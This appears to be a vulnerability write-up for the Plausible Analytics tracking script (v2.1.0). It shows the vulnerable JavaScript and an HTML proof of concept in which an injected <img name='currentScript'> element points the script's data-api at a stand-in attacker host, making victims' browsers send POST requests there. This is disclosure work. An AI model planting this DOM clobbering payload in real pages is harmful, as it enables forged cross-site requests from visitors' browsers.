## plausible-analytics

### Meta

+ Library: plausible-analytics
+ Stars: 19.7K
+ Version: v2.1.0
+ Fingerprint: `window.plausible !== undefined`
+ Payload: ```<img name="currentScript" data-domain="attack.hulk" data-api="https://attack.hulk">```
+ Impact: CSRF
+ CVE: N/A
+ Status: Reported
+ Security Policy: Email
+ Foundby: TheHulk

### Library

https://github.com/plausible/analytics

### Vulnerable Code Snippet

```javascript
    var a = window.location
      , r = window.document
      , o = r.currentScript
      , l = o.getAttribute("data-api") || new URL(o.src).origin + "/api/event";
    function s(t, e) {
        t && console.warn("Ignoring Event: " + t),
        e && e.callback && e.callback()
    }
    function t(t, e) {
        if (/^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$/.test(a.hostname) || "file:" === a.protocol)
            return s("localhost", e);
        if ((window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress) && !window.__plausible)
            return s(null, e);
        try {
            if ("true" === window.localStorage.plausible_ignore)
                return s("localStorage flag", e)
        } catch (t) {}
        var i = {}
          , n = (i.n = t,
        i.u = a.href,
        i.d = o.getAttribute("data-domain"),
        i.r = r.referrer || null,
        e && e.meta && (i.m = JSON.stringify(e.meta)),
        e && e.props && (i.p = e.props),
        new XMLHttpRequest);
        n.open("POST", l, !0),
        n.setRequestHeader("Content-Type", "text/plain"),
        n.send(JSON.stringify(i)),
        n.onreadystatechange = function() {
            4 === n.readyState && e && e.callback && e.callback({
                status: n.status
            })
        }
    }
```

## PoC

```html
<!--Library-->
<script defer data-domain="mydomain.com" src="https://plausible.io/js/script.js"></script>
<!--Library-->

<!--Payload-->
<img name="currentScript" data-domain="attack.hulk" data-api="https://attack.hulk">
<!--Payload-->
```

The gadgets helps attacker to send arbitrary post request to arbitrary domain on the vicitim's browser. 